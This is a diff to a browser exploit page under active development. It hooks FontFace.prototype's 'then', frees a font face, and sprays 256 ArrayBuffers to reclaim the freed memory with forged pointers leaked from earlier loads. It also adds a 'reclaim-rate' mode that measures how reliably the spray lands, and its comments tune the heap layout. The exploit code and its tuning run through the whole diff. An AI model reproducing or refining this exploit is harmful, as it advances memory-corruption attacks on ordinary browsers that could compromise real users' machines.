@@ -60,12 +60,17 @@ function qw(v,off){var s='';for(var i=7;i>=0;i--)s+=hex8(v[off+i]);return s;}
 
 var arm=parseInt(location.hash.slice(1));if(isNaN(arm))arm=0;
 // death detection FIRST — before this load's own START beacon resets alive
-var diedSince=0,deadArm=null;
+var diedSince=0,deadArm=null,reclaimMode=false;
 try{
   var sx=new XMLHttpRequest();sx.open('GET','/p686state',false);sx.send();
   if(sx.status===200){
     var st=JSON.parse(sx.responseText);
     if(st.died){diedSince=1;deadArm=st.deadArm;}
+    // Reclaim-rate mode: every load is a zero-shape prime, so no walk ever
+    // follows a forged pointer and nothing can die. That makes the page
+    // auto-cycle unattended and isolates one question — how often a load
+    // adopts the spray — from forge content and from load position.
+    reclaimMode = (st.mode==='reclaim');
     // Operator rewind: `GET /?p686reset=1&arm=N` makes the next load restart
     // the series at arm N, so a version whose forge never landed can be
     // re-measured without touching console storage by hand. One-shot.
@@ -93,7 +98,7 @@ try{
     if(!isNaN(stored))arm=stored;
   }catch(e){}
 })();
-emit('START','v8.1 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
+emit('START','v8.2 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
 
 var priorT='',priorI='';
 // if the previous load died, its T/impl are addresses of the dead process
@@ -141,16 +146,18 @@ if(typeof delta!=='number'&&typeof delta!=='string')arm=0,delta=ARMS[0];
 // forge outcome measures content, not load position.
 var phase=null;
 try{phase=localStorage.getItem('p686phase');}catch(e){}
-var primeMode = !!diedSince || (phase!=='arm') || !priorI;
+var primeMode = reclaimMode ? true : (!!diedSince || (phase!=='arm') || !priorI);
 if(primeMode)phase='prime';
 var forgeVal='';
 var FORGE_CELLS=[];
 // next-load phase is fixed here: after a prime the next load runs the arm;
 // after an arm load (survived or not) the next load re-primes. A dead load
 // short-circuits this via diedSince anyway.
-try{localStorage.setItem('p686phase', primeMode?'arm':'prime');}catch(e){}
+if(!reclaimMode)try{localStorage.setItem('p686phase', primeMode?'arm':'prime');}catch(e){}
 if(primeMode){
-  emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+dlabel(arm));flush();
+  if(reclaimMode)emit('SEQ','reclaim-rate probe: zero shape, no forge');
+  else emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+dlabel(arm));
+  flush();
 }else{
   // forge plan: list of {off,val} qwords written little-endian (LSB first)
   // into every spray buffer. 0x00..0x6f is zeroed first so the face shape
@@ -191,7 +198,7 @@ if(primeMode){
 }
 flush();
 
-var style,ff,fired=false,map=[];
+var style,ff,fired=false,map=[],SPRAY_N=256;
 // v8.1: the family names carry the load number. Under a repeated family the
 // second load of a WebProcess never adopted our spray (6/6 no-reclaim), while
 // the first load after a process restart always did (2/2). A per-load unique
@@ -218,7 +225,11 @@ Object.defineProperty(FontFace.prototype,'then',{
     try{document.fonts.delete(ff);}catch(e){}
     document.body.offsetHeight;
     map=[];
-    for(var k=0;k<16;k++){
+    // v8.2: 256 buffers, not 16. On a cold process 16 always won; on a warm
+    // one they never did, three loads in a row, which reads as a 192-byte
+    // freelist already holding the previous document's spray. 256 x 192 B is
+    // 48 KiB, three orders below the 2048-buffer battery that OOMs a process.
+    for(var k=0;k<SPRAY_N;k++){
       var ab=new ArrayBuffer(192);
       var v=new Uint8Array(ab);
       // FULL deterministic AB in every mode. Prime mode restores the
@@ -232,7 +243,7 @@ Object.defineProperty(FontFace.prototype,'then',{
       // so 0xAA here is the only honest reclaim proof. A nonzero-byte count
       // cannot serve as one: our own forge prefill is nonzero by construction.
       v[0x85]=0xAA;
-      if(primeMode && priorT.length===16 && priorI.length===16){
+      if(primeMode && !reclaimMode && priorT.length===16 && priorI.length===16){
         for(var b=0;b<8;b++){
           v[0x58+b]=parseInt(priorT.substr(16-2*(b+1),2),16);
           v[0x68+b]=parseInt(priorI.substr(16-2*(b+1),2),16);
@@ -250,7 +261,7 @@ Object.defineProperty(FontFace.prototype,'then',{
       }
       map.push({ab:ab,view:v});
     }
-    try{document.fonts.check('1em s0');}catch(e){}
+    try{document.fonts.check('1em '+S);}catch(e){}
     return undefined;
   },
   set:function(){}
